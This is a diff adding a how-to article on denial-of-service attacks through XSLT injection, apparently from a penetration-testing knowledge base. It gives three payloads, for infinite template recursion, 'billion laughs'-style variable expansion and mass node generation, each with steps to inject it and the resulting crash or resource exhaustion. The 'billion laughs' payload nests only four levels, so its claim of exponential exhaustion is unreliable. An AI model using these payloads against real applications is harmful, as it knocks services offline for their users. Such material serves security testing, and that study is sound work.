@@ -1,0 +1,100 @@
+---
+title: Exploiting XSLT for Denial of Service Attacks
+description: Explore Denial of Service via XSLT injection, causing server resource
+  exhaustion using malicious payloads in web applications.
+keywords:
+- XSLT injection
+- Denial of Service
+- DoS attack
+- resource exhaustion
+- server disruption
+- infinite recursion
+- billion laughs
+- memory exhaustion
+---
+
+# Denial of Service
+
+## Context
+
+In this article, we aim to demonstrate and execute Denial of Service (DoS) attacks through XSLT injection. By exploiting XSLT processing capabilities, attackers can potentially exhaust server resources or disrupt the availability of web applications. To fully grasp the content, it is assumed that the reader has prior knowledge of XSLT processing, XML structures, and basic server resource management.
+
+## Theory
+
+### Resource Exhaustion via XSLT Injection
+
+Denial of Service through XSLT exploits involves crafting specific payloads that harness the resource-intensive nature of XSLT processing. By utilizing user-supplied templates and functions, attackers can induce excessive computation or memory use, leading to server fatigue. The vulnerability lies in the XSLT’s allowance for unrestricted processing, which can be manipulated to create infinite loops, recursion, or exponential data expansion.
+
+### Attack Vectors for XSLT-Based DoS
+
+Several attack vectors facilitate XSLT-based Denial of Service:
+
+- Inject XSLT payloads that trigger infinite template recursion or excessive node generation.
+- Leverage functions such as `generate-id` or string manipulation to invoke CPU or memory exhaustion.
+- Utilize recursive templates or the infamous 'billion laughs' style entity expansion to surge resource consumption.
+
+### Common Payload Patterns
+
+- **Infinite Loop**: This pattern involves a template calling itself recursively without a termination condition.
+- **Billion Laughs**: This approach involves nested expansion of XSLT variables or templates, amplifying the processing workload exponentially.
+- **Memory Exhaustion**: This involves assigning large variables or repeatedly creating nodes to saturate the server's memory.
+
+## Practice
+
+### Infinite Recursion via XSLT Template
+
+To create an infinite recursion using XSLT templates, insert the payload below in an application that processes XSLT transformations:
+
+```xml
+<xsl:template match="/">
+    <xsl:call-template name="loop"/>
+</xsl:template>
+
+<xsl:template name="loop">
+    <xsl:call-template name="loop"/>
+</xsl:template>
+```
+
+- **Action**: Submit this payload through an XSLT injection point within the web application.
+- **Effect**: The server reaches stack overflow or CPU exhaustion due to unending recursive template calls, resulting in a significant slowdown or application crash.
+
+### Billion Laughs-Style Expansion in XSLT
+
+This attack involves creating an exponential increase in processing using the following payload:
+
+```xml
+<xsl:variable name="a">A</xsl:variable>
+<xsl:variable name="b"><xsl:value-of select="$a"/><xsl:value-of select="$a"/></xsl:variable>
+<xsl:variable name="c"><xsl:value-of select="$b"/><xsl:value-of select="$b"/></xsl:variable>
+<xsl:variable name="d"><xsl:value-of select="$c"/><xsl:value-of select="$c"/></xsl:variable>
+
+<xsl:template match="/">
+    <xsl:value-of select="$d"/>
+</xsl:template>
+```
+
+- **Action**: Inject this payload into any vulnerable interface that conducts XSLT transformations.
+- **Effect**: Memory and CPU resources are exhausted due to the exponential expansion, potentially leading to a denial of service state.
+
+### Large Node Generation for Memory Exhaustion
+
+Create a significant number of nodes to burden server memory with the following payload:
+
+```xml
+<xsl:template match="/">
+    <xsl:for-each select="1 to 1000000">
+        <item>DoS</item>
+    </xsl:for-each>
+</xsl:template>
+```
+
+- **Action**: Inject this payload into the server's XSLT processing input.
+- **Effect**: Excessive node creation consumes server memory, causing the application to become unresponsive or crash.
+
+## Tools
+
+- **Burp Suite**
+- **OWASP ZAP**
+- **curl**
+  
+These tools can aid in crafting payloads and injecting them into target applications to test for vulnerabilities and exploit them effectively for analysis and understanding.
